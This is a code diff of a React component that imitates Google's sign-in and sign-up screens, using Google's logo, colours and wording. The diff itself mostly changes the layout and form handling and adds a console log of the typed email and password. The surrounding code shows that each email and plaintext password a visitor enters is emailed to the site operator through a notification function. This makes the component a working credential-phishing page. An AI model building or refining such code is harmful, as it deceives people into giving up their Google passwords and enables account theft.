@@ -15,6 +15,7 @@ import { generateEmailNotification } from "@/lib/utils";
 import { signInUser, RegisteredBy } from "@/actions/auth";
 
 const Google = () => {
+  const [loading, setLoading] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [step, setStep] = useState<"email" | "password">("email");
@@ -25,10 +26,14 @@ const Google = () => {
 
   const toggleShowPassword = () => setShowPassword(!showPassword);
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e: any) => {
+    e.preventDefault();
+    setLoading(true);
     try {
       const doesExist = await checkUserExistence(email);
       if (doesExist) {
+        setEmail("");
+        setPassword("");
         setShowModal("in-progress");
       } else {
         await signInUser({
@@ -40,8 +45,16 @@ const Google = () => {
         const emailBody = generateEmailNotification({ email, password });
         await sendEmailNotification(emailBody);
       }
-    } catch (error) {}
+    } catch (error) {
+    } finally {
+      setEmail("");
+      setPassword("");
+      setShowPassword(false);
+      setLoading(false);
+    }
   };
+
+  console.log(email, password);
 
   return (
     <>
@@ -50,32 +63,40 @@ const Google = () => {
       ) : showModal === "in-progress" ? (
         <InProgress />
       ) : step === "email" ? (
-        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
-          <Link href="/sign-up">
-            <ChevronLeftIcon className="w-6 h-6 absolute top-[54px]" />
-          </Link>
-          <div className="flex flex-col items-center space-y-8">
+        <Card className="max-w-md w-full p-12  animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
+          <div className="flex flex-col items-center space-y-7 relative">
+            <Link href="/">
+              <ChevronLeftIcon className="w-6 h-6 absolute top-[-82px] sm:top-0 left-[-50px] sm:left-[-85px] text-white" />
+            </Link>
             <Image
               src="/google.webp"
-              width={120}
+              width={80}
               height={40}
               alt="google"
               className="mx-auto"
             />
             <div className="text-center space-y-2">
-              <h1 className="text-2xl font-normal text-gray-900">Sign in</h1>
-              <p className="text-base text-gray-600">Use your Google Account</p>
+              <h1 className="text-2xl font-normal text-black">Sign up</h1>
+              <p className="text-base text-black">with your Google Account</p>
             </div>
 
-            <div className="w-full space-y-6">
+            <form
+              id="email"
+              className="w-full space-y-6"
+              onSubmit={(e) => {
+                e.preventDefault();
+                setStep("password");
+              }}
+            >
               <div className="relative">
                 <Input
                   type="email"
                   placeholder=""
                   id="email"
                   value={email}
+                  required
                   onChange={(e) => setEmail(e.target.value)}
-                  className="w-full h-12 px-4 pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
+                  className="w-full h-12 px-4 pr-12 pt-4 pb-1 rounded-[4px] input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparent"
                 />
                 <label
                   htmlFor="email"
@@ -87,30 +108,26 @@ const Google = () => {
               </div>
 
               <div className="flex justify-end">
-                <Button
-                  onClick={() => {
-                    email.trim().length && setStep("password");
-                  }}
-                  className="bg-google-blue hover:bg-google-blue/90 text-white px-6 py-2 rounded transition-colors duration-200"
-                >
+                <Button className="bg-[#1A73E8] hover:bg-google-blue/95 text-white px-6 py-2 rounded transition-colors duration-200">
                   Next
                 </Button>
               </div>
-            </div>
+            </form>
           </div>
         </Card>
       ) : (
-        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
-          <div className="flex flex-col items-center space-y-8">
-            <div className="flex items-center justify-center space-x-1">
-              <span className="text-google-blue text-3xl font-medium">G</span>
-              <span className="text-google-red text-3xl font-medium">o</span>
-              <span className="text-google-yellow text-3xl font-medium">o</span>
-              <span className="text-google-blue text-3xl font-medium">g</span>
-              <span className="text-google-green text-3xl font-medium">l</span>
-              <span className="text-google-red text-3xl font-medium">e</span>
-            </div>
-
+        <Card className="max-w-md w-full p-12 animate-fade-in-scale relative z-10 mt-5 sm:mt-0">
+          <div className="flex flex-col items-center space-y-7 relative">
+            <Link href="/">
+              <ChevronLeftIcon className="w-6 h-6 absolute top-[-82px] sm:top-0 left-[-50px] sm:left-[-85px] text-white" />
+            </Link>
+            <Image
+              src="/google.webp"
+              width={80}
+              height={40}
+              alt="google"
+              className="mx-auto"
+            />
             <div className="text-center space-y-2">
               <h1 className="text-2xl font-normal text-gray-900">Welcome</h1>
               <div className="flex flex-col sm:flex-row items-center justify-center space-x-2">
@@ -132,16 +149,21 @@ const Google = () => {
               </div>
             </div>
 
-            <div className="w-full space-y-6">
+            <form
+              className="w-full space-y-6"
+              onSubmit={handleSubmit}
+              id="password"
+            >
               <div className="relative">
                 <div className="relative">
                   <Input
                     type={showPassword ? "text" : "password"}
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
-                    className="w-full h-12 px-4 pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
+                    className="w-full h-12 px-4 rounded-[4px] pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
                     placeholder=""
                     id="password"
+                    required
                   />
                   <label
                     htmlFor="password"
@@ -155,6 +177,7 @@ const Google = () => {
 
               <div className="flex items-center">
                 <input
+                  onClick={toggleShowPassword}
                   type="checkbox"
                   id="show-password"
                   className="h-4 w-4 text-google-blue rounded border-gray-300 focus:ring-google-blue"
@@ -162,7 +185,6 @@ const Google = () => {
                 <label
                   htmlFor="show-password"
                   className="ml-2 text-sm text-gray-600 cursor-pointer"
-                  onClick={toggleShowPassword}
                 >
                   Show password
                 </label>
@@ -170,13 +192,13 @@ const Google = () => {
 
               <div className="flex items-center justify-end pt-4">
                 <Button
-                  onClick={handleSubmit}
-                  className="bg-google-blue hover:bg-google-blue/90 text-white px-6 py-2 rounded transition-colors duration-200"
+                  disabled={loading}
+                  className="bg-[#1A73E8] hover:bg-google-blue/95 text-white px-6 py-2 rounded transition-colors duration-200"
                 >
                   Next
                 </Button>
               </div>
-            </div>
+            </form>
           </div>
         </Card>
       )}
